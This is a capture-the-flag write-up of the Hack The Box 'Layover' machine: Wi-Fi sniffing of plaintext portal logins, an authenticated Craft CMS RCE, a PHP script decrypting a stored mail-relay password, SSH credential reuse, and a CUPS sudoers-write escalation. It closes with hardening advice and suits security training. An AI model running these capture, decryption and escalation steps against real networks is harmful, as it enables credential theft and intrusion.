# Hack The Box: Layover — Technical Writeup

## Executive Summary
This report details the end-to-end compromise of the **Layover** machine. The attack chain pivots through a Windows RDP jumpbox into a second, wireless-reachable network, recovers plaintext credentials from open Wi-Fi traffic, exploits an authenticated Craft CMS RCE for a web foothold, decrypts a stored service credential for lateral movement over SSH, and finally abuses a root-owned CUPS service for privilege escalation.

| Metric | Details |
|---|---|
| **Target Platform** | Hack The Box — Layover |
| **Operating System** | Linux (with a Windows RDP jumpbox) |
| **Primary Category** | Network Pivoting · Wireless · Web Exploitation · Privilege Escalation |
| **Attack Vectors** | RDP jumpbox, open Wi-Fi HTTP credential capture, Craft CMS authenticated RCE, credential decryption, CUPS privilege escalation |

---

## Attack Path Overview

1. **Initial access** — RDP → `contractor@airside-ws01`
2. **Wireless recon** — monitor `wlan3` → capture `/tmp/channel6.pcap` → recover Jenny's credentials
3. **Web exploitation** — Craft CMS 5.9.8 → authenticated RCE → `www-data`
4. **Lateral movement** — `.env` + MariaDB → decrypt mail-relay password → SSH as `aporter`
5. **Privilege escalation** — CUPS 2.4.16 → privileged file write → root

---

## Phase 1: Reconnaissance & RDP Foothold

### 1.1 Scan the external target

```bash
nmap -sC -sV -p- -T4 <HTB_TARGET_IP>
```

The important externally exposed services are:

| Port | Service | Purpose |
|---|---|---|
| 22/tcp | SSH | Direct SSH is **not** the intended initial entry |
| 3389/tcp | RDP / xrdp | Remote desktop into the jumpbox |

### 1.2 Connect over RDP

```bash
xfreerdp3 /v:<HTB_TARGET_IP> \
  /u:contractor \
  /p:'<PROVIDED_PASSWORD>' \
  +clipboard /dynamic-resolution
```

Once connected, establish the environment and privileges:

```bash
whoami        # contractor
hostname      # airside-ws01
sudo -l       # (ALL : ALL) ALL
ip a
ip route
```

Key findings:

- `eth0`: `10.159.143.45/24`
- Wireless interfaces present: `wlan2` and `wlan3`
- `contractor` holds full `(ALL : ALL) ALL` sudo on the jumpbox

**Why this matters:** `airside-ws01` is a stepping stone, not the final target. Its wireless interfaces bridge into a second network that hosts the internal portal.

---

## Phase 2: Wireless Reconnaissance & Credential Capture

### 2.1 Inspect the wireless interfaces

```bash
iw dev
iw dev wlan2 link
nmcli device status
ip a
```

`wlan2` was used for connectivity; `wlan3` was free for packet capture. Connecting `wlan2` to the open SSID:

```
HTB International WiFi
```

yielded `10.13.37.182/24`, with the route into the internal network via `10.13.37.1`. The target portal was `10.13.37.10` (`portal.international.htb`).

### 2.2 Put `wlan3` into monitor mode (channel 6)

```bash
sudo ip link set wlan3 down
sudo iw dev wlan3 set type monitor
sudo ip link set wlan3 up
sudo iw dev wlan3 set channel 6
iw dev wlan3 info
```

Monitor mode lets the interface observe all traffic on its channel rather than behaving as an ordinary connected client.

### 2.3 Capture the traffic

```bash
sudo timeout 180 tcpdump -i wlan3 -nn -s0 -w /tmp/channel6.pcap
```

The capture must overlap with a client's login over the wireless network. `/tmp/channel6.pcap` is the evidence artifact from this stage.

### 2.4 Recover the credentials in Wireshark

Filter for HTTP, then narrow to POST requests:

```
http
http.request.method == "POST"
```

Look for requests to `portal.international.htb` → `/miles/login.php`, then use **Follow → TCP Stream** to read the form data.

The login was transmitted over **unencrypted HTTP on an open wireless network**, exposing Jenny's username and password in plaintext. No hash cracking was involved — the credentials were recovered directly from captured application traffic.

**Path established:** Open Wi-Fi → HTTP credential capture → Jenny's login → Craft CMS.

---

## Phase 3: Craft CMS Authenticated RCE

### 3.1 Reach the internal portal

```
http://portal.international.htb
```

If the hostname does not resolve, add the verified mapping on the accessing host:

```
10.13.37.10 portal.international.htb
```

Jenny's recovered credentials provide access to the **Craft CMS 5.9.8** control panel.

### 3.2 From authentication to execution

Logging in is only a foothold. The objective is to confirm that an authenticated application request can execute a command on the server. The intended route is an authenticated RCE involving **Yii2 behavior injection through the element-search functionality**.

Expected execution context:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
hostname: portal
```

### 3.3 Why it works

The underlying issue is constructing Yii2 objects from attacker-controlled configuration without adequate sanitization of behavior-related keys. An authenticated request can attach a behavior that ultimately invokes a command-execution method.

> **Note on the CVE:** published sources disagree on the exact identifier and exploit variant for this chain (CVE-2026-44011 and a patch bypass associated with CVE-2026-28695 are both cited). The vulnerability class is consistent; tie the specific patch-bypass details to the proof-of-concept actually used rather than treating every published exploit as interchangeable.

---

## Phase 4: Lateral Movement — `www-data` to `aporter`

### 4.1 Inspect the application configuration

```bash
cd /var/www/portal
ls -la
cat .env
```

The relevant variables:

```
CRAFT_SECURITY_KEY
CRAFT_DB_USER
CRAFT_DB_PASSWORD
CRAFT_DB_DATABASE
```

These give the application encryption key and the credentials to inspect the database. The database password and the OS password should **not** be assumed identical.

### 4.2 Inspect MariaDB

```bash
mysql -u craftuser -p
```

```sql
USE craft;
SHOW TABLES;
SELECT name, value FROM htbairways_settings;
```

The custom `htbairways_settings` table holds the mail-relay configuration:

| Field | Purpose |
|---|---|
| `mailRelayHost` | Outbound mail server |
| `mailRelayPort` | Mail server port |
| `mailRelayUser` | Service account name |
| `mailRelayPassword` | Encrypted password |

The mail-relay account is `aporter`, with its password stored as encrypted data.

### 4.3 Decrypt the stored password

Craft CMS uses Yii2's security functions to encrypt/decrypt values. With both the ciphertext (from the database) and the application key (from `.env`), the value can be decrypted using the same framework:

```php
<?php
require '/var/www/portal/vendor/autoload.php';
require '/var/www/portal/vendor/yiisoft/yii2/Yii.php';

$key  = getenv('CRAFT_SECURITY_KEY');
$data = base64_decode($argv[1]);

$security = new \yii\base\Security();

echo $security->decryptByKey($data, $key) . PHP_EOL;
```

Save as `decrypt.php`, supply the key via the environment, and pass the encoded database value as its argument. Recovered service credentials:

```
Username: aporter
Password: *************
```

### 4.4 SSH into the portal

```bash
ssh aporter@10.13.37.10
whoami      # aporter
hostname    # portal
cat ~/user.txt
```

**Key concept — credential reuse:** a password stored for an application mail-relay service was also valid for a Linux account, enabling lateral movement from the web process to `aporter`.

---

## Phase 5: Privilege Escalation — `aporter` to root (CUPS)

### 5.1 Enumerate local privileges and services

```bash
id
sudo -l
ss -tlnp
ps aux | grep '[c]upsd'
ls -l /run/cups/cups.sock
```

The relevant service is **CUPS 2.4.16**, listening on loopback at `127.0.0.1:631` and running as root. Ordinary `sudo -l` offers no usable path; the weakness is a world-writable CUPS socket and a vulnerable local IPP authentication flow.

### 5.2 The CUPS vulnerability (CVE-2026-34990)

The privileged CUPS daemon can be induced to disclose a local authorization token, which then authorizes administrative printer operations. The chain:

1. Trigger an authentication challenge from a rogue IPP endpoint.
2. Capture the resulting CUPS local authorization token.
3. Create or modify a printer with a **file-backed device URI**.
4. Submit a print job that writes a sudoers rule to a privileged directory.
5. Verify that the new rule grants `aporter` passwordless sudo.

This is not a conventional SUID exploit — it abuses a privileged service's authentication and printer-backend behavior to achieve a root-owned file write.

### 5.3 Transfer and run the exploit

```bash
# from the host holding the PoC
scp exploit.py aporter@10.13.37.10:/tmp/exploit.py

# on the portal
ssh aporter@10.13.37.10
ls -l /tmp/exploit.py
```

> `scp` copies a file, it does not execute it. Verify the source file, destination path, and remote permissions before running. Confirm the PoC version matches this CVE rather than assuming a differently named script is interchangeable.

### 5.4 Verify the escalation

```bash
sudo -l      # should now allow ALL without a password
sudo -i
whoami       # root
id
cat /root/root.txt
```

---

## Phase 6: Attack Chain Summary

| Stage | Technique | Result |
|---|---|---|
| 1 | Nmap + RDP | Access to `airside-ws01` as `contractor` |
| 2 | Wireless interface enumeration | Identified `wlan2` / `wlan3` |
| 3 | Monitor mode + Wireshark | Captured HTTP traffic, recovered Jenny's credentials |
| 4 | Craft CMS authenticated RCE | Command execution as `www-data` |
| 5 | Config + database analysis | Recovered `aporter` credentials |
| 6 | SSH | User flag on `portal` |
| 7 | CUPS local privilege escalation | Root and root flag |

---

## Phase 7: Security Recommendations

* **Wireless security:** never run production authentication over open Wi-Fi; enforce WPA2/WPA3-Enterprise and ensure all portals use HTTPS so credentials can't be passively captured.
* **Transport encryption:** the portal login must be served over TLS — plaintext HTTP for authentication is the root cause of the initial compromise.
* **Jumpbox hardening:** isolate and restrict the wireless interfaces exposed on a jumpbox; a stepping-stone host should not freely bridge into sensitive internal networks.
* **Patch Craft CMS:** keep the CMS current and minimize the authenticated attack surface exposed to low-privilege portal users.
* **Secret management:** avoid reusing an application-service password for an OS account; store secrets so that the encryption key and ciphertext are not both reachable from the same application execution context.
* **Patch CUPS (CVE-2026-34990):** update CUPS, avoid running `cupsd` as root where possible, and tighten permissions on the local CUPS socket to prevent unauthorized local IPP operations.

---

*Author: **Oussama DIMOQRATI***
